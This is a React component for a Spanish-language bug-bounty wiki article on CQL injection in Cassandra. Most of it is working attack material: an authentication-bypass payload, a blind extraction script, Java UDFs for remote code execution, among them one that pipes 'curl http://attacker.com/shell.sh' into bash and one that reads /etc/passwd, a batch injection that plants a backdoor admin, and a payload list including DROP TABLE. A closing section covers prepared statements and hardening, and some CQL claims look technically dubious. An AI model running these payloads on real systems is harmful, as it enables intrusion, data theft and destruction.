/**
 * CASSANDRA CQL INJECTION
 * Inyección en queries CQL (Cassandra Query Language)
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Database, AlertTriangle, Shield, Code2, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function CassandraInjectionContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="CQL Injection en Cassandra">
        <Paragraph>
          Aunque Cassandra usa <Strong>CQL (Cassandra Query Language)</Strong> similar a SQL, 
          también es vulnerable a inyecciones cuando las queries se construyen con concatenación de strings. 
          La diferencia clave: <Strong>Cassandra no tiene operador UNION</Strong>, lo que requiere técnicas diferentes.
        </Paragraph>

        <AlertInfo title="Diferencias con SQL">
          <ul className="mt-2 space-y-1">
            <ListItem>❌ No existe <InlineCode>UNION</InlineCode> ni <InlineCode>JOIN</InlineCode></ListItem>
            <ListItem>❌ No hay subconsultas (subqueries)</ListItem>
            <ListItem>❌ No existe <InlineCode>OR</InlineCode> en WHERE</ListItem>
            <ListItem>✅ SÍ existe <InlineCode>ALLOW FILTERING</InlineCode> (peligroso)</ListItem>
            <ListItem>✅ SÍ existen funciones y user-defined functions (UDF)</ListItem>
          </ul>
        </AlertInfo>
      </Section>

      <Section id="bypass-autenticacion" title="1. Bypass de Autenticación">
        <Subsection title="Escenario Vulnerable">
          <CodeBlock
            language="javascript"
            title="Node.js con concatenación insegura"
            code={`const cassandra = require('cassandra-driver');
const client = new cassandra.Client({ contactPoints: ['127.0.0.1'] });

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // ❌ VULNERABLE - Concatenación directa
  const query = \`SELECT * FROM users 
                 WHERE username = '\${username}' 
                 AND password = '\${password}'\`;
  
  const result = await client.execute(query);
  
  if (result.rows.length > 0) {
    res.json({ success: true, user: result.rows[0] });
  }
});`}
          />
        </Subsection>

        <Subsection title="Payload - Comentar Condición de Password">
          <Paragraph>
            A diferencia de SQL, Cassandra usa <InlineCode>//</InlineCode> para comentarios de línea:
          </Paragraph>

          <CodeBlock
            language="json"
            title="Request malicioso"
            code={`POST /login HTTP/1.1
Content-Type: application/json

{
  "username": "admin' //",
  "password": "cualquiercosa"
}`}
          />

          <CodeBlock
            language="sql"
            title="Query resultante"
            code={`SELECT * FROM users 
WHERE username = 'admin' //' AND password = 'cualquiercosa'

-- Todo después de // es comentario
-- Equivalente a: SELECT * FROM users WHERE username = 'admin'`}
          />

          <AlertWarning title="Resultado">
            El atacante inicia sesión como 'admin' sin conocer la contraseña.
          </AlertWarning>
        </Subsection>
      </Section>

      <Section id="exfiltracion" title="2. Exfiltración de Datos">
        <Subsection title="ALLOW FILTERING: Tu Nuevo Mejor Amigo">
          <Paragraph>
            En Cassandra, <InlineCode>ALLOW FILTERING</InlineCode> permite queries sobre columnas no indexadas. 
            Podemos abusar de esto para extraer datos:
          </Paragraph>

          <CodeBlock
            language="sql"
            title="Payload - Enumerar usuarios"
            code={`' ALLOW FILTERING //

-- Query completa:
SELECT * FROM users WHERE username = '' ALLOW FILTERING //' AND password = '...'

-- Retorna TODOS los usuarios`}
          />
        </Subsection>

        <Subsection title="Blind Injection con Token">
          <Paragraph>
            Cassandra usa <Strong>tokens</Strong> para particionar datos. Podemos usar esto para blind injection:
          </Paragraph>

          <CodeBlock
            language="python"
            title="Script - Exfiltración character-by-character"
            code={`import requests
import string

url = "http://target.com/api/search"
charset = string.ascii_lowercase + string.digits + '_'

def check_char(position, char):
    # Usar token() para comparaciones
    payload = f"' AND token(username) > 0 AND username >= '{char}' ALLOW FILTERING //"
    
    response = requests.post(url, json={
        "search": payload
    })
    
    return len(response.json()['results']) > 0

extracted = ""
for pos in range(1, 50):
    for char in charset:
        if check_char(pos, extracted + char):
            extracted += char
            print(f"Found: {extracted}")
            break

print(f"Final: {extracted}")`}
          />
        </Subsection>
      </Section>

      <Section id="udf-rce" title="3. RCE via User-Defined Functions">
        <AlertDanger title="¡UDFs pueden ejecutar código Java!">
          Si tienes permisos para crear UDFs, puedes ejecutar código Java arbitrario.
        </AlertDanger>

        <Subsection title="Crear UDF Maliciosa">
          <CodeBlock
            language="sql"
            title="Payload - UDF para RCE"
            code={`CREATE OR REPLACE FUNCTION evil_udf(input text)
RETURNS NULL ON NULL INPUT
RETURNS text
LANGUAGE java
AS $$
    try {
        Runtime.getRuntime().exec(input);
        return "executed";
    } catch (Exception e) {
        return e.getMessage();
    }
$$;

-- Ejecutar comando
SELECT evil_udf('curl http://attacker.com/shell.sh | bash') FROM system.local;`}
          />
        </Subsection>

        <Subsection title="UDF para Exfiltración">
          <CodeBlock
            language="sql"
            title="Payload - Leer archivos del sistema"
            code={`CREATE FUNCTION read_file(filepath text)
RETURNS NULL ON NULL INPUT
RETURNS text
LANGUAGE java
AS $$
    try {
        java.nio.file.Path path = java.nio.file.Paths.get(filepath);
        byte[] data = java.nio.file.Files.readAllBytes(path);
        return new String(data);
    } catch (Exception e) {
        return "error";
    }
$$;

-- Leer archivo
SELECT read_file('/etc/passwd') FROM system.local;`}
          />
        </Subsection>

        <AlertWarning title="Permisos Necesarios">
          Necesitas permiso <InlineCode>CREATE</InlineCode> en el keyspace. 
          Pero muchas aplicaciones usan credenciales con permisos excesivos.
        </AlertWarning>
      </Section>

      <Section id="batch-injection" title="4. Batch Injection">
        <Paragraph>
          Cassandra permite ejecutar múltiples statements en un BATCH:
        </Paragraph>

        <CodeBlock
          language="sql"
          title="Payload - Inyectar múltiples queries"
          code={`'; INSERT INTO admins (username, password) VALUES ('backdoor', 'hacked123'); //

-- Query completa:
UPDATE users SET email = ''; 
INSERT INTO admins (username, password) VALUES ('backdoor', 'hacked123'); 
//' WHERE id = ...`}
        />

        <CodeBlock
          language="javascript"
          title="Código vulnerable a batch injection"
          code={`// Aplicación permite actualizar perfil
app.post('/update-profile', async (req, res) => {
  const { userId, bio } = req.body;
  
  // ❌ VULNERABLE
  const query = \`UPDATE users SET bio = '\${bio}' WHERE user_id = \${userId}\`;
  await client.execute(query);
});`}
        />

        <Subsection title="Exploit Completo">
          <CodeBlock
            language="json"
            title="Request - Crear usuario admin"
            code={`POST /update-profile HTTP/1.1

{
  "userId": 123,
  "bio": "My bio'; INSERT INTO users (user_id, username, password, role) VALUES (999, 'hacker', 'pwned', 'ADMIN') USING TIMESTAMP 9999999999999999; //"
}`}
          />

          <AlertInfo>
            <InlineCode>USING TIMESTAMP</InlineCode> con valor muy alto asegura que 
            nuestro INSERT tenga prioridad sobre otros updates.
          </AlertInfo>
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación para Developers">
        <AlertDanger title="✅ Código Seguro con Prepared Statements">
          <Strong>SIEMPRE usa prepared statements con placeholders</Strong>
        </AlertDanger>

        <CodeBlock
          language="javascript"
          title="✅ SEGURO - Prepared statement"
          code={`const cassandra = require('cassandra-driver');
const client = new cassandra.Client({ contactPoints: ['127.0.0.1'] });

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // ✅ SEGURO - Usar placeholders
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
  const params = [username, password];
  
  const result = await client.execute(query, params, { prepare: true });
  
  if (result.rows.length > 0) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});`}
        />

        <CodeBlock
          language="python"
          title="✅ SEGURO - Python con cassandra-driver"
          code={`from cassandra.cluster import Cluster
from cassandra.query import SimpleStatement

cluster = Cluster(['127.0.0.1'])
session = cluster.connect('myapp')

# ✅ SEGURO - Usar prepared statement
def get_user(username):
    query = "SELECT * FROM users WHERE username = ?"
    prepared = session.prepare(query)
    
    # Los valores se escapan automáticamente
    result = session.execute(prepared, [username])
    return result.one()

# ✅ También seguro con named parameters
def update_profile(user_id, new_bio):
    query = "UPDATE users SET bio = :bio WHERE user_id = :id"
    session.execute(query, {'bio': new_bio, 'id': user_id})`}
        />

        <Subsection title="Deshabilitar UDFs en Producción">
          <CodeBlock
            language="yaml"
            title="cassandra.yaml - Configuración segura"
            code={`# Deshabilitar User Defined Functions
enable_user_defined_functions: false

# Deshabilitar scripted UDFs (JavaScript, etc)
enable_scripted_user_defined_functions: false

# Limitar permisos de usuario de aplicación
# En cqlsh:
REVOKE CREATE ON ALL KEYSPACES FROM app_user;
GRANT SELECT, INSERT, UPDATE, DELETE ON KEYSPACE myapp TO app_user;`}
          />
        </Subsection>

        <Subsection title="Validación de Input">
          <CodeBlock
            language="javascript"
            title="Validación adicional (defensa en profundidad)"
            code={`function validateUsername(username) {
  // Solo alfanumérico y guiones bajos
  if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
    throw new Error('Invalid username format');
  }
  
  // Blacklist de caracteres peligrosos
  const dangerous = ["'", '"', ';', '--', '//', '/*', '*/', 'ALLOW FILTERING'];
  for (const pattern of dangerous) {
    if (username.toLowerCase().includes(pattern.toLowerCase())) {
      throw new Error('Invalid characters detected');
    }
  }
  
  return username;
}

app.post('/login', async (req, res) => {
  try {
    const username = validateUsername(req.body.username);
    const password = req.body.password;
    
    // Aún así, usar prepared statement
    const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
    const result = await client.execute(query, [username, password], { prepare: true });
    
    // ... resto del código
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});`}
          />
        </Subsection>
      </Section>

      <Section id="herramientas" title="5. Herramientas de Testing">
        <CodeBlock
          language="bash"
          title="SQLMap con CQL (limitado)"
          code={`# SQLMap tiene soporte limitado para Cassandra
sqlmap -u "http://target.com/api/user?id=1" \\
  --dbms=cassandra \\
  --batch \\
  --level 5 \\
  --risk 3`}
        />

        <CodeBlock
          language="python"
          title="Script personalizado de testing"
          code={`import requests

payloads = [
    "' ALLOW FILTERING //",
    "' OR 1=1 ALLOW FILTERING //",
    "'; DROP TABLE users; //",
    "' AND token(id) > 0 //",
    "admin' //",
]

for payload in payloads:
    response = requests.post('http://target.com/login', json={
        'username': payload,
        'password': 'test'
    })
    
    print(f"Payload: {payload}")
    print(f"Status: {response.status_code}")
    print(f"Response length: {len(response.text)}")
    print("---")`}
        />
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: SQLite Local Injection</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/sqlite-local-injection`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar SQLite en aplicaciones locales</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
